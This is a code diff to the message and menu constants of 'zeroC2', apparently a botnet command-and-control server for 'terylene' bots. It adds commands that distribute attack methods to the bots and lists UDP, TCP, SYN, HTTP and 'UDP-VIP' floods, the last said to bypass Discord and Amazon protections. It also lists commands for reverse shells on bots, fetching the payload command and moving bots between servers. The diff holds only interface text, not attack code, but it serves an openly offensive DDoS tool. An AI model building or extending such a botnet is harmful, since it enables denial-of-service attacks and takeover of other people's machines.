@@ -40,7 +40,7 @@ const (
 	Welcome = `
 	_____               ____ ____  
 	|__  /___ _ __ ___  / ___|___ \ 
-	  / // _ \ '__/ _ \| |     __) |  beta
+	  / // _ \ '__/ _ \| |     __) |  beta 0.2.4
 	 / /|  __/ | | (_) | |___ / __/ 
 	/____\___|_|  \___/ \____|_____|
 `
@@ -48,36 +48,29 @@ const (
 	Cmd = "Z2::->(⋆♱✮♱⋆)>"
 
 	Help = `
+
+		C2 COMMANDS
 methods  -> list all the methods
 help     -> help menu
 clear    -> clear screen
 list     -> list all bots
-transfer -> transfer/mitigate bots to another zeroC2 server
 payload  -> get payload command
-shell    -> spawn a reverse shell
-kill     -> kill terylene bots
+
+		TERYLENE COMMANDS
+transfer -> transfer/mitigate terylene bots to another zeroC2 server
+shell    -> spawn a reverse shell on a terylene bot
+kill     -> kill a terylene bot
+
+		METHOD COMMANDS
+addmethod    -> add a method and distribute to connected terylene bots
+deletemethod -> delete a method from the C2 and connected terylene bots
+
+		OTHER COMMANDS
 exit     -> exit
-`
-	Methods = `
-format:
-!method <target> <port> <duration>
-
-             ( う-´)づ︻╦̵̵̿╤── \(˚☐˚”)/
-+---------+-----------------------------------------------+
-| methods | descriptions                                  |
-+---------+-----------------------------------------------+
-| UDP     | UDP flood                                     |
-| TCP     | TCP flood                                     |
-| SYN     | SYN flood                                     |
-| HTTP    | HTTP get flood                                |
-| UDPRAPE | Crafted UDP flood                             |
-| UDP-VIP | UDP flood to bypass discord , amazon and more |
-+---------+-----------------------------------------------+
-
 `
 	Ddosmsg = `attack broadcasted to all terylene`
 
-	InvalidIp = `Invalid ip address (must be a public ipv6 address)`
+	InvalidIp = `Invalid ip address (must be a public ipv4 address)`
 
 	Invalidport = `Invalid port`
 
@@ -103,6 +96,23 @@ const (
 	Killhelp   = `kill <connID/all>`
 	Killallsuc = `all terylene has been killed`
 	Killone    = `%s has been killed`
+)
+
+// method management
+const (
+	AddmethodHelp    = `addmethod <method name>`
+	DeletemethodHelp = `deletemethod <method name>`
+)
+
+var (
+	AllMethods = [][]string{
+		{"UDP", "UDP flood", "!UDP <target> <port> <duration>"},
+		{"TCP", "TCP flood", "!TCP <target> <port> <duration>"},
+		{"SYN", "SYN flood", "!SYN <target> <port> <duration>"},
+		{"HTTP", "HTTP get flood", "!HTTP <target> <port> <duration>"},
+		{"UDPRAPE", "Crafter UDP flood", "!UDPRAPE <target> <port> <duration>"},
+		{"UDP-VIP", "UDP flood to bypass discord, amazon and more", "!UDP-VIP <target> <port> <duration>"},
+	}
 )
 
 // interaction shell message
@@ -155,7 +165,7 @@ const (
 	⠀⠀⠀⠠⣍⣒⡲⡽⡇⣾⡟⠁⢀⡴⣋⢿⣿⣯⣤⣬⢡⣿⡏⣾⣿⡯⣿⣻⣯⡻⣾⣿⣷⣿⣞⣌⢷⠱⠀⡨⢁⠄⠀⠀⡀⠀⠀⠀
 	⠀⠀⠀⠀⢀⠎⣰⣎⣕⡟⠀⢠⣿⢿⣿⣿⠟⡿⣎⣻⣿⣿⣷⣿⠯⢮⡻⣿⣿⣯⣾⡟⣿⣿⣿⣿⣿⣳⠈⢂⠡⠄⠂⣉⠀⠤⠀⠂
 	⠀⠀⠀⠀⠘⢱⢣⢯⣜⣌⣻⣯⣜⣹⣿⢃⣠⠻⠖⡵⢸⣿⠻⣿⣷⣿⡟⢻⣾⢊⣩⣿⣿⣿⣿⣿⣿⣽⣇⠐⠄⠬⠥⠤⠤⠤⠀⠀
-	⠀⠀⠀⠀⠀⣼⣏⣼⠁⡟⣾⢻⠟⣿⣿⣿⣻⣴⣻⡗⣾⣿⡯⠟⢻⢩⣑⣾⣷⣿⠿⢿⣵⣟⣩⣿⣾⢩⣿⡀⠪⢉⡉⠉⠀⠀⠀⠀    ERROR !!!!
+	⠀⠀⠀⠀⠀⣼⣏⣼⠁⡟⣾⢻⠟⣿⣿⣿⣻⣴⣻⡗⣾⣿⡯⠟⢻⢩⣑⣾⣷⣿⠿⢿⣵⣟⣩⣿⣾⢩⣿⡀⠪⢉⡉⠉⠀⠀⠀⠀    SHELL ERROR !!!!
 	⠀⠀⠀⢀⡾⣽⢼⠼⡎⣤⣿⣿⣶⣿⢯⣿⢽⢛⢲⢸⣁⣿⣧⣤⣾⡿⠟⣗⣟⣿⣟⣳⠆⣡⣾⣿⢻⡼⢿⢓⠒⡄⠀⠀⠀⠀⠀⠀
 	⠀⠀⢀⠎⡝⢸⠀⣆⣿⣿⣿⣝⣥⣿⣯⣊⣥⡟⠆⠢⠀⣷⣾⣿⣩⠛⢭⢯⣾⣿⡿⢿⢾⠏⣿⣿⢝⡖⡳⢠⡛⣿⡀⠀⠀⠀⠀⠀
 	⠀⢠⠋⡼⢀⣌⣼⣿⢹⡿⣿⡿⢿⣿⠟⣿⣿⣿⢾⣿⡷⣿⣿⣟⢿⣿⣤⣾⢻⣿⣠⣿⣶⣾⣯⣯⢃⠝⡹⢹⢱⢿⣧⠀⠀⠀⠀⠀
@@ -171,4 +181,38 @@ const (
 	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀
 `
 	Shellhelp = "shell <connID>"
+)
+
+const (
+	//custom method arts
+	AddmethodArt = `
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⠤⠖⠒⠐⠲⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠾⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣉⣷⡦⠤⠤⣤⡀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡞⠉⠀⢠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡈⠛⠶⣤⡈⠻⡄⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⡾⠟⠃⣠⡔⣺⠃⡎⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠈⠳⣄⢸⡇⠀⣧⢰⡄⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⢛⡿⠋⠀⡴⠋⡽⡱⠁⣸⡅⠀⡀⠀⠀⠀⠀⠀⡞⢸⠀⢠⡇⠀⠀⠈⠛⢧⡀⣿⠀⠙⢦⠀⠀⠀
+	⠀⠀⠀⠀⠀⢀⡴⠞⠁⢠⠞⠀⠀⣀⡇⣼⣱⠁⠀⡟⡇⠀⢹⠀⠀⠀⠀⣸⢁⡟⠀⡼⢷⡀⢸⡀⠀⠀⠙⠛⡀⠀⠀⢣⠀⠀
+	⠀⠀⠀⠀⠀⠉⠀⠀⢀⠏⠀⠀⡼⠁⢇⣿⠃⢀⣷⣇⣿⠀⠸⡀⠀⠀⣞⣇⣾⠇⣼⠃⠈⢷⠘⣧⣤⠀⠀⠀⡇⠀⠀⠈⢧⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⣰⣾⠁⢀⡼⣿⠀⣸⡟⢿⡟⣧⠀⣷⠀⣰⢹⡿⣿⣟⣉⣉⡉⠙⢷⢿⣾⡀⠀⠀⡇⠀⠀⠀⠘⡇
+	⠀⠀⠀⠀⠀⠀⠀⠀⡇⣰⢟⡇⢠⠞⡀⣿⠀⣿⣇⣼⡟⢛⣷⣏⣷⡇⢸⡵⠿⠟⣽⣿⣿⠿⢿⣿⣿⡇⠀⠀⡇⠀⠀⠀⠀⢿
+	⠀⠀⠀⠀⠀⠀⠀⠀⣧⡇⢸⡰⠃⡇⠘⣿⢸⡿⠁⣠⣿⣿⡟⣿⡇⢷⣿⠀⠀⠀⠙⠛⠋⠀⠀⣸⣿⣧⠀⢰⠃⠀⠀⢰⠂⢸
+	⠀⠀⠀⠀⠀⠀⠀⠀⠹⢠⣿⠁⠀⣇⠀⠘⣿⣿⣿⠏⠿⠛⣱⠃⡿⠀⠹⡄⠀⠀⠀⠀⣀⣠⣴⡿⢿⣿⣇⡞⠀⠀⢠⠏⠀⣼   adding methods
+	⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢿⠀⣰⢻⡀⠤⣽⣤⣽⠶⠤⠀⠁⠀⠛⠿⠂⠘⠒⠒⣋⣭⢿⡿⠋⣰⠿⣯⡿⢇⠀⣠⠏⠀⢀⡇
+	⠀⠀⠀⠀⠀⠀⠴⠋⠀⠀⠸⣠⠇⣠⣧⣄⡀⣩⣭⣭⡽⠟⠃⠀⠀⠀⠀⠀⠐⠋⠁⢀⣾⠃⠘⣁⣄⡟⠀⢀⣿⣿⠀⠀⡼⠁
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠋⢻⣿⣌⠙⢿⣿⡉⠁⠀⠀⠘⠛⠋⠉⠁⠀⣴⠟⣁⣴⣾⣿⢿⣧⠞⣫⠟⢁⣀⡜⠁⠀
+	⠀⠀⠀⠀⠀⠀⢀⣀⣠⡴⠿⢻⠃⣰⣺⠈⢻⠷⢦⣬⣗⣦⣄⣀⡀⠀⠀⠤⠴⠟⠓⣋⠽⠛⣿⡿⢾⡟⠛⠁⣠⡿⠋⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣴⣿⣿⡆⣿⠀⠀⠉⢳⢭⣷⣬⠁⠀⠀⠀⣀⣴⡞⠥⣶⠟⠁⣠⠞⣁⣄⡼⠋⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⣿⠀⢧⠀⡀⢀⡀⡌⠀⢨⠛⣿⡳⠄⠉⠉⣀⣴⣾⣥⣶⣿⣿⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠻⠀⠘⣆⡇⣼⡇⠇⣰⣿⣿⣿⣿⣿⣟⡋⠔⠉⠱⠛⠋⢹⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡇⢻⣠⢏⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣀⣠⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⣨⡿⠿⣷⡈⠉⣿⡙⠛⠿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣟⠫⠀⣠⡾⢋⡸⢿⣿⣷⡄⠀⢸⣿⢻⣯⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠚⠉⠀⣸⠟⢣⣾⣫⠴⠋⠀⠀⠈⠉⠀⠀⠘⢃⢻⣽⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⣀⠠⠴⠖⠛⠉⠀⠀⢀⣠⡾⠋⢠⡿⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠉⢻⣿⠿⣦⡀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⣾⠋⠈⠉⣹⣿⠒⠲⠽⠶⣦⣄⣀⣤⣄⠀⢰⢿⣤⣴⣫⡽⣷⢻⡍⠳⡄⠀⠀⠀⠀⠀
+	⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣎⡄⠀⠀⠿⣷⠀⠀⠀⠀⠀⠀⠀⠙⣆⢸⢸⠁⠀⠀⠀⣿⠘⣷⡀⠀⠠⣄⠀⠀⠀
+	⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠏⠁⠀⠀⣰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠘⠶⠞⠀⠀⠀⠀⠹⣟⣾⢿⡄⠀⠈⢳⡀⠀
+	⢠⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠃⢀⣠⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣄⣤⡀⠀⠀⠀⠀⣿⠇⣊⢻⡀⠀⠀⢻⡄
+	⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⣿⣼⢻⣿⠁⠀⠀⠀⣰⣟⠀⠈⣸⡷⠀⠀⠀⣷
+`
 )
